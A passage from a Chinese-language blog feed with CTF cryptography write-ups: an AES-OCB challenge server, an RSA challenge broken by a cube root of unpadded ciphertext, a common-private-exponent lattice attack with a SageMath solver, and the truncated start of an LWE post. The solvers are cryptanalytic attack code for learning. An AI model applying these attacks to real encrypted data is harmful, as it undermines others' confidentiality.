class="keyword">if</span> choice == <span class="number">1</span>:</span><br><span class="line">                    nonce = self.recvhex(prompt=<span class="string">b&#x27;Enter nonce &gt; &#x27;</span>)</span><br><span class="line">                    message = self.recvhex(prompt=<span class="string">b&#x27;Enter message &gt; &#x27;</span>)</span><br><span class="line">                    associate_data = <span class="string">b&#x27;from &#x27;</span> + USERNAME</span><br><span class="line">                    ciphertext, tag = self.encrypt(nonce, message, associate_data)</span><br><span class="line">                    self.send(<span class="built_in">str</span>.encode(<span class="string">f&quot;ciphertext: <span class="subst">&#123;ciphertext.<span class="built_in">hex</span>()&#125;</span>&quot;</span>))</span><br><span class="line">                    self.send(<span class="built_in">str</span>.encode(<span class="string">f&quot;tag: <span class="subst">&#123;tag.<span class="built_in">hex</span>()&#125;</span>&quot;</span>))</span><br><span class="line"></span><br><span class="line">                <span class="keyword">elif</span> choice == <span class="number">2</span>:</span><br><span class="line">                    nonce = self.recvhex(prompt=<span class="string">b&#x27;Enter nonce &gt; &#x27;</span>)</span><br><span class="line">                    ciphertext = self.recvhex(prompt=<span class="string">b&#x27;Enter ciphertext &gt; &#x27;</span>)</span><br><span class="line">                    tag = self.recvhex(prompt=<span class="string">b&#x27;Enter tag &gt; &#x27;</span>)</span><br><span class="line">                    associate_data = self.recvhex(prompt=<span class="string">b&#x27;Enter associate data &gt; &#x27;</span>)</span><br><span class="line">                    message = self.decrypt(nonce, ciphertext, tag, associate_data)</span><br><span class="line">                    self.send(<span class="built_in">str</span>.encode(<span class="string">f&quot;message: <span class="subst">&#123;message.<span class="built_in">hex</span>()&#125;</span>&quot;</span>))</span><br><span class="line"></span><br><span class="line">                <span class="keyword">elif</span> choice == <span class="number">3</span>:</span><br><span class="line">                    nonce = self.recvhex(prompt=<span class="string">b&#x27;Enter nonce &gt; &#x27;</span>)</span><br><span class="line">                    ciphertext = self.recvhex(prompt=<span class="string">b&#x27;Enter ciphertext &gt; &#x27;</span>)</span><br><span class="line">                    tag = self.recvhex(prompt=<span class="string">b&#x27;Enter tag &gt; &#x27;</span>)</span><br><span class="line">                    associate_data = <span class="string">b&#x27;from Alice&#x27;</span></span><br><span class="line">                    message = self.decrypt(nonce, ciphertext, tag, associate_data)</span><br><span class="line">                    <span class="keyword">if</span> message == <span class="string">b&#x27;please_give_me_the_flag&#x27;</span>:</span><br><span class="line">                        self.send(FLAG)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">elif</span> choice == <span class="number">4</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                self.send(<span class="string">b&#x27;Error!&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        signal.alarm(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        self.send(<span class="string">b&#x27;Bye!&#x27;</span>)</span><br><span class="line">        self.request.close()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ForkedServer</span>(<span class="params">socketserver.ForkingMixIn, socketserver.TCPServer</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    HOST, PORT = <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">10000</span></span><br><span class="line">    print(HOST, PORT)</span><br><span class="line">    server = ForkedServer((HOST, PORT), Task)</span><br><span class="line">    server.allow_reuse_address = <span class="literal">True</span></span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure><blockquote><p>ä¸é‡è¦çš„å‡½æ•°ç”¨passçœç•¥äº†</p></blockquote><h2 id="analyses"><a href="#analyses" class="headerlink" title="analyses"></a>analyses</h2><blockquote><p>å…¨åœºåªæœ‰ä¸€è§£çš„é¢˜, çœŸçš„ä¸ä¼š, ç­‰wpå­¦ä¹ äº†</p></blockquote><h1 id="0x01-RSA-attack"><a href="#0x01-RSA-attack" class="headerlink" title="0x01 RSA attack"></a>0x01 RSA attack</h1><h2 id="problem-1"><a href="#problem-1" class="headerlink" title="problem"></a>problem</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p1 = getPrime(<span class="number">1024</span>)</span><br><span class="line">print(p1)</span><br><span class="line"><span class="comment">#p1=172071201093945294154292240631809733545154559633386758234063824053438835958515543354911249971174172649606257936857627547311760174511316984409767738981247877005802155796623587461774104951797122995266217334158736848307655543970322950339988489801672160058805422153816950022590644650247595501280192205506649936031</span></span><br><span class="line"></span><br><span class="line">p2 = p1 - random(<span class="number">999</span>,<span class="number">99999</span>)</span><br><span class="line">print(p2)</span><br><span class="line"><span class="comment">#p2=172071201093945294154292240631809733545154559633386758234063824053438835958515543354911249971174172649606257936857627547311760174511316984409767738981247877005802155796623587461774104951797122995266217334158736848307655543970322950339988489801672160058805422153816950022590644650247595501280192205506649902034</span></span><br><span class="line"></span><br><span class="line">p_1=<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,p1+<span class="number">1</span>):</span><br><span class="line">    p_1*=i</span><br><span class="line">p3 = sympy.nextPrime(p_1 % p2 )</span><br><span class="line"></span><br><span class="line">p4 = p3 &gt;&gt; <span class="number">50</span> &lt;&lt; <span class="number">50</span></span><br><span class="line">p = p4</span><br><span class="line"><span class="keyword">while</span>(isPrime(P)!=<span class="number">1</span>):</span><br><span class="line">    P = p + random.randint(<span class="number">0</span>,<span class="number">2</span>**<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line">Q = getPrime(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">e = <span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span></span><br><span class="line">N = P * Q</span><br><span class="line">print(N)</span><br><span class="line"><span class="comment">#N=28592245028568852124815768977111125874262599260058745599820769758676575163359612268623240652811172009403854869932602124987089815595007954065785558682294503755479266935877152343298248656222514238984548734114192436817346633473367019138600818158715715935132231386478333980631609437639665255977026081124468935510279104246449817606049991764744352123119281766258347177186790624246492739368005511017524914036614317783472537220720739454744527197507751921840839876863945184171493740832516867733853656800209669179467244407710022070593053034488226101034106881990117738617496520445046561073310892360430531295027470929927226907793</span></span><br><span class="line"></span><br><span class="line">flag=bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(flag,e,N)</span><br><span class="line">print(c)</span><br><span class="line"><span class="comment">#c=15839981826831548396886036749682663273035548220969819480071392201237477433920362840542848967952612687163860026284987497137578272157113399130705412843449686711908583139117413</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="analyse"><a href="#analyse" class="headerlink" title="analyse"></a>analyse</h2><h3 id="æˆ‘ä¼°è®¡ç€è¿™æ˜¯éé¢„æœŸ"><a href="#æˆ‘ä¼°è®¡ç€è¿™æ˜¯éé¢„æœŸ" class="headerlink" title="æˆ‘ä¼°è®¡ç€è¿™æ˜¯éé¢„æœŸ"></a>æˆ‘ä¼°è®¡ç€è¿™æ˜¯éé¢„æœŸ</h3><p>çœ‹å®Œä¸€éä»£ç å°±çŸ¥é“æ˜¯å·²çŸ¥$p$é«˜ä½æ±‚$m$äº†, å¯æƒœè¿™é¢˜ç›®è·Ÿæ–°ç”Ÿèµ›çš„é¢˜ä¸€ä¸ªå°¿æ€§, æ²¡æœ‰å¯¹$m$è¿›è¡Œpadding, å¯¼è‡´å¯ä»¥ç›´æ¥å¯¹$c$å¼€3æ¬¡æ–¹â€¦â€¦</p><h3 id="éé¢„æœŸexp"><a href="#éé¢„æœŸexp" class="headerlink" title="éé¢„æœŸexp"></a>éé¢„æœŸexp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">c = <span class="number">15839981826831548396886036749682663273035548220969819480071392201237477433920362840542848967952612687163860026284987497137578272157113399130705412843449686711908583139117413</span></span><br><span class="line">print(long_to_bytes(iroot(c,<span class="number">3</span>)[<span class="number">0</span>]))</span><br></pre></td></tr></table></figure><h3 id="é¢„æœŸè§£"><a href="#é¢„æœŸè§£" class="headerlink" title="é¢„æœŸè§£"></a>é¢„æœŸè§£</h3><p>å¨å°”é€Šå®šç†???? é¢˜ç›®æ˜¯ä¸æ˜¯æé”™äº†, p2&lt;p1, é‚£ä¹ˆé˜¶ä¹˜çš„æ—¶å€™è‚¯å®šæœ‰p2åœ¨p_1é‡Œé¢â€¦. æ¨¡p2ç›´æ¥æ˜¯0äº†</p><blockquote><p>????????????</p></blockquote><h1 id="0x02-ezCRT"><a href="#0x02-ezCRT" class="headerlink" title="0x02 ezCRT"></a>0x02 ezCRT</h1><h2 id="problem-2"><a href="#problem-2" class="headerlink" title="problem"></a>problem</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> shuffle</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;flag is here&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shuffle_flag</span>(<span class="params">s</span>):</span></span><br><span class="line">    str_list = <span class="built_in">list</span>(s)</span><br><span class="line">    shuffle(str_list)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(str_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nl = []</span><br><span class="line">el = []</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> count != <span class="number">5</span>:</span><br><span class="line">    p = getPrime(<span class="number">512</span>)</span><br><span class="line">    q = getPrime(<span class="number">512</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    d = gmpy2.next_prime(bytes_to_long(flag))</span><br><span class="line">    e = gmpy2.invert(d, phi)</span><br><span class="line">    nl.append(n)</span><br><span class="line">    el.append(<span class="built_in">int</span>(e))</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">print(nl)</span><br><span class="line">print(el)</span><br><span class="line"></span><br><span class="line">cl = []</span><br><span class="line">flag = shuffle_flag(flag.decode()).encode()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nl)):</span><br><span class="line">    cl.append(<span class="built_in">pow</span>(bytes_to_long(flag), el[i], nl[i]))</span><br><span class="line">print(cl)</span><br></pre></td></tr></table></figure><h2 id="analyses-1"><a href="#analyses-1" class="headerlink" title="analyses"></a>analyses</h2><p>Common Private Exponent -&gt; <a href="https://www.ijcsi.org/papers/IJCSI-9-2-1-311-314.pdf">https://www.ijcsi.org/papers/IJCSI-9-2-1-311-314.pdf</a></p><p>å½“ç§é’¥$d$æ»¡è¶³<br>$$<br>d&lt;N_r^{Î´_r} \\<br>Î´_r&lt;12âˆ’{1 \over 2(r+1)}âˆ’log_{N_r} (6)<br>$$<br>å…¶ä¸­$N_r$ä¸ºæœ€å¤§çš„$N$, å°±å¯ä»¥ä½¿ç”¨è¿™ä¸ªæ–¹æ³•</p><p>æˆ‘ä»¬å¯ä»¥è®°$\phi(N_i) = (N_i-(p_i+q_i-1))=(N_i-S_i)$, ä¸”$N_1&lt;N_2&lt;\cdots &lt;N_r &lt; 2N_1$ å› ä¸ºæ¯æ¬¡ç”¨çš„éƒ½æ˜¯åŒä¸€ä¸ªç§é’¥$d$, é‚£ä¹ˆå¯ä»¥æœ‰:<br>$$<br>\begin{cases}<br>e_1d - k_1N_1 = 1 - S_1 \\<br>e_2d - k_2N_2 = 1 - S_2 \\<br>\vdots \\<br>e_rd - k_rN_r = 1 - S_r<br>\end{cases}<br>$$</p><p>å¯ä»¥æ„é€ æ ¼å­<br>$$<br>(d,k_1,k_2,\cdots,k_r)<br>\begin{pmatrix}<br>\sqrt {N_r}&amp; e_1&amp;e_2&amp;\cdots&amp;e_r \\<br>0&amp;-N_1&amp;0&amp;0&amp;0 \\<br>\vdots&amp;\vdots&amp;\ddots&amp;\vdots&amp;\vdots \\<br>0&amp;0&amp;0&amp;-N_{r-1}&amp;0 \\<br>0&amp;0&amp;0&amp;0&amp;-N_{r}<br>\end{pmatrix}<br>=<br>(d\sqrt {N_r},1-S_1,1-S_2,\cdots,1-S_r)<br>$$<br>è§„çº¦å‡ºæ¥å, å–ç¬¬ä¸€è¡Œç¬¬ä¸€ä¸ªå°±æ˜¯$d\sqrt{N_r}$äº†.<br>è®¡ç®—å‡º$d$å°±æ˜¯flagäº†</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sagemath</span></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes <span class="keyword">as</span> l2b</span><br><span class="line">N = [...]</span><br><span class="line">E = [...]</span><br><span class="line">PK = []</span><br><span class="line"><span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">zip</span>(N,E):</span><br><span class="line">    PK.append([i,j])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(PK)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i,<span class="built_in">len</span>(PK)):</span><br><span class="line">        <span class="keyword">if</span> PK[j][<span class="number">0</span>] &gt; PK[i][<span class="number">0</span>]:</span><br><span class="line">            PK[j],PK[i] = PK[i] ,PK[j]</span><br><span class="line">PK = PK[::-<span class="number">1</span>]</span><br><span class="line">M=iroot(<span class="built_in">int</span>(PK[-<span class="number">1</span>][<span class="number">0</span>]),<span class="built_in">int</span>(<span class="number">2</span>))[<span class="number">0</span>]</span><br><span class="line">a=[<span class="number">0</span>]*<span class="number">6</span></span><br><span class="line">a[<span class="number">0</span>]=[M,PK[<span class="number">0</span>][<span class="number">1</span>],PK[<span class="number">1</span>][<span class="number">1</span>],PK[<span class="number">2</span>][<span class="number">1</span>],PK[<span class="number">3</span>][<span class="number">1</span>],PK[<span class="number">4</span>][<span class="number">1</span>]]</span><br><span class="line">a[<span class="number">1</span>]=[<span class="number">0</span>,-PK[<span class="number">0</span>][<span class="number">0</span>],<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">a[<span class="number">2</span>]=[<span class="number">0</span>,<span class="number">0</span>,-PK[<span class="number">1</span>][<span class="number">0</span>],<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">a[<span class="number">3</span>]=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,-PK[<span class="number">2</span>][<span class="number">0</span>],<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">a[<span class="number">4</span>]=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,-PK[<span class="number">3</span>][<span class="number">0</span>],<span class="number">0</span>]</span><br><span class="line">a[<span class="number">5</span>]=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,-PK[<span class="number">4</span>][<span class="number">0</span>]]</span><br><span class="line"></span><br><span class="line">Mat = matrix(ZZ,a)</span><br><span class="line">Mat_LLL=Mat.BKZ()</span><br><span class="line">d = <span class="built_in">int</span>(<span class="built_in">abs</span>(Mat_LLL[<span class="number">0</span>][<span class="number">0</span>])//M)</span><br><span class="line"><span class="keyword">assert</span> d * M == <span class="built_in">abs</span>(Mat_LLL[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">l2b(d)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;è™ç¬¦å‰çš„ä¸€ä¸ªæ¯”èµ›, å·éƒ½æ²¡æ³¨å†Œ, å€Ÿéš”å£å®¿èˆçš„å·ç©äº†ä¸€ä¸‹. å¯†ç ä¸€å…±å°±ä¸‰é¢˜, ä¸€é¢˜AES-OCBéš¾çˆ†(åæ­£æˆ‘æ˜¯ç¬¬ä¸€æ¬¡çŸ¥é“OCBè¿™ä¸ªæ¨¡å¼), å›½å†…å±…ç„¶æœä¸åˆ°å…³äºOCBçš„èµ„æ–™. åªæ‰¾åˆ°ä¸€ä¸¤ä¸ªpaper, æ²¡è¿™ä¸ªè€å¿ƒçœ‹. å‰©ä¸‹ä¸¤é¢˜, ä¸€é¢˜ç­¾åˆ°(ä¼°è®¡æ˜¯éé¢„æœŸæ‰è¿™ä¹ˆç®€å•), è¿˜æœ‰ä¸€é“</summary>
      
    
    
    
    <category term="WriteUp" scheme="http://tearsjin.github.io/categories/WriteUp/"/>
    
    
    <category term="Crypto" scheme="http://tearsjin.github.io/tags/Crypto/"/>
    
    <category term="RSA" scheme="http://tearsjin.github.io/tags/RSA/"/>
    
    <category term="AES" scheme="http://tearsjin.github.io/tags/AES/"/>
    
    <category term="OCB" scheme="http://tearsjin.github.io/tags/OCB/"/>
    
  </entry>
  
  <entry>
    <title>The learning of LWE</title>
    <link href="http://tearsjin.github.io/2021/03/31/The-learning-of-LWE/"/>
    <id>http://tearsjin.github.io/2021/03/31/The-learning-of-LWE/</id>
    <published>2021-03-31T10:56:47.000Z</published>
    <updated>2021-03-31T02:14:34.288Z</updated>
    
    <content type="html"><![CDATA[<p>åšAnt&amp;d3çš„æ—¶å€™å‘ç°è‡ªå·±Latticeè¿˜ä¸ä¼š, æ‰€ä»¥å°±å»å­¦äº†ä¸€æ³¢Lattice, é¡ºä¾¿å°±äº†è§£äº†ä¸€ä¸‹LWE, å‘ç°è¿™ç©æ„å±…ç„¶æœ‰ä¸‰æ¬¡æ¯”èµ›ç”¨çš„éƒ½æ˜¯åŒä¸€ä¸ªæ¿å­, ä¹Ÿæ¯ä¸ªéƒ½å»åšäº†åˆ†æäº†ä¸€ä¸‹, ç„¶åå°±é›†ä¸­åœ¨è¿™é‡Œäº†.</p><blockquote><p>æ„Ÿè°¢ä¸€ä½å¤§å¤§å¤§å¤§å¤§å¸ˆå‚…è¯¦ç»†çš„wpï¼Œæˆ‘æ‰èƒ½è¿™ä¹ˆå¿«çš„æ˜ç™½åŸç†ï¼ŒæŒ‡è·¯ â€”&gt;  <a href="https://blog.soreatu.com/">https://blog.soreatu.com/</a></p></blockquote><h1 id="X-NUCA-Diamond"><a href="#X-NUCA-Diamond" class="headerlink" title="X-NUCA Diamond"></a>X-NUCA Diamond</h1><h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> sage.crypto.lwe <span class="keyword">import</span> LWE</span><br><span class="line"><span class="keyword">from</span> sage.stats.distributions.discrete_gaussian_integer <span class="keyword">import</span> DiscreteGaussianDistributionIntegerSampler <span class="keyword">as</span> DGDIS</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG</span><br><span class="line"><span class="keyword">assert</span> FLAG.startswith(<span class="string">b&quot;X-NUCA&#123;&quot;</span>) <span class="keyword">and</span> FLAG.endswith(<span class="string">b&quot;&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">A = random_matrix(ZZ, <span class="number">320</span>, <span class="number">5</span>, x = <span class="number">10</span>, y = <span class="number">1000</span>)</span><br><span class="line">B = Matrix(A * vector([randint(<span class="number">1</span>, <span class="number">2</span>^<span class="number">1024</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>))</span><br><span class="line"></span><br><span class="line">L = LWE(n = <span class="number">25</span>, q = <span class="number">1000</span>, D = DGDIS(<span class="number">3</span>))</span><br><span class="line">S = [L() <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>)]</span><br><span class="line"></span><br><span class="line">M = Matrix(<span class="number">64</span>, <span class="number">25</span>, [<span class="built_in">int</span>(i).__xor__(<span class="built_in">int</span>(j)) <span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">zip</span>(A.<span class="built_in">list</span>(), (Matrix([x <span class="keyword">for</span> x, _ <span class="keyword">in</span> S])).<span class="built_in">list</span>())])</span><br><span class="line">T = Matrix([randint(<span class="number">1</span>, <span class="number">2</span>^<span class="number">1024</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>)])</span><br><span class="line">R = T.transpose().stack(T * vector([y <span class="keyword">for</span> _, y <span class="keyword">in</span> S]).change_ring(ZZ))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">key = sha256(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">str</span>, L._LWE__s))).encode()).digest()</span><br><span class="line">iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">ct = cipher.encrypt(FLAG)</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">f.write(<span class="built_in">str</span>(B.<span class="built_in">list</span>()).encode() + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">f.write(<span class="built_in">str</span>(M.<span class="built_in">list</span>()).encode() + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">f.write(<span class="built_in">str</span>(R.<span class="built_in">list</span>()).encode() + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">f.write((iv + ct).<span class="built_in">hex</span>().encode())</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><h2 id="ä¸€äº›æ–°è§åˆ°çš„å‡½æ•°"><a href="#ä¸€äº›æ–°è§åˆ°çš„å‡½æ•°" class="headerlink" title="ä¸€äº›æ–°è§åˆ°çš„å‡½æ•°"></a>ä¸€äº›æ–°è§åˆ°çš„å‡½æ•°</h2><ol><li><p><code>random_matrix(ZZ, 5, 320, x = 10, y = 1000)</code>: éšæœºç”Ÿæˆä¸€ä¸ªæ•´æ•°çš„$320 \cdot 5$çŸ©é˜µ, å…¶å…ƒç´ çš„å–å€¼èŒƒå›´æ˜¯$[x,y)$ä¹Ÿå°±æ˜¯$[10,1000)$</p></li><li><p><code>LWE(n = 25, q = 1000, D = DGDIS(3))</code>: ç”Ÿæˆä¸€ä¸ª25ç»´ $mod \ 1000$çš„LWEå¯¹è±¡</p><p><code>D</code> - an error distribution such as an instance of <code>DiscreteGaussianDistributionIntegerSampler</code></p></li><li><p><code>stack()</code>: åœ¨æœ«å°¾æ·»åŠ ä¸€è¡Œ</p></li></ol><h2 id="é¢˜ç›®ä¸­ç»™å‡ºçš„ä¸€äº›æ¡ä»¶"><a href="#é¢˜ç›®ä¸­ç»™å‡ºçš„ä¸€äº›æ¡ä»¶" class="headerlink" title="é¢˜ç›®ä¸­ç»™å‡ºçš„ä¸€äº›æ¡ä»¶"></a>é¢˜ç›®ä¸­ç»™å‡ºçš„ä¸€äº›æ¡ä»¶</h2><ul><li>é¦–å…ˆæ˜¯ä¸€ä¸ª<code>320*5</code>çš„çŸ©é˜µ$A$ï¼Œä¹˜ä¸Šäº†ä¸€ä¸ªéšæœºå˜æ¢çŸ©é˜µ<code>5*7</code>çš„çŸ©é˜µ$R$ï¼Œå¾—åˆ°äº†ä¸€ä¸ª<code>320*7</code>çš„çŸ©é˜µB</li><li>ç„¶åæ˜¯ä¸€ä¸ªLWEï¼Œç”Ÿæˆäº†64ç»„æ•°æ®ï¼Œ$sâ‹…A_{lwe}+e=a$ï¼Œæ²¡æœ‰ç›´æ¥ç»™æˆ‘ä»¬$A_{lwe}$å’Œ$a$ã€‚åªç»™äº†$M=A{lwe}\bigoplus A$ï¼Œä»¥åŠç”¨$s$ä½œä¸ºAESçš„keyï¼Œå¯¹flagè¿›è¡Œäº†åŠ å¯†ã€‚</li><li>å†å°±æ˜¯ä¸€ä¸ªknapsack problemï¼Œç”¨é•¿åº¦ä¸º64çš„å‘é‡$a$ä¸ä¸€ä¸ªå¦å¤–ä¸€ä¸ªå¾ˆå¤§çš„é•¿åº¦ä¸º64çš„éšæœºå‘é‡$T$ç›¸ä¹˜ï¼Œå¾—åˆ°ä¸€ä¸ªå¾ˆå¤§çš„æ•°$sum$ã€‚ç»™äº†$T$ä»¥åŠ$sum$ã€‚</li></ul><h2 id="knapsack-problem"><a href="#knapsack-problem" class="headerlink" title="knapsack problem"></a>knapsack problem</h2><p>è¿™é‡Œæœ‰ä¸€ä¸ªèƒŒåŒ…é—®é¢˜<br>$$<br>a_0T_0+a_1T_1+â€¦+a_{63}T_{63} = sum<br>$$<br>å…¶ä¸­å·²çŸ¥$T_0,T_1,â€¦,T_{63},sum$,è€Œä¸”$T_i$éå¸¸å¤§, $a_i \le 1000$ , å¯ä»¥ç”±ä¸Šè¿°å¼å­æ„é€ æ 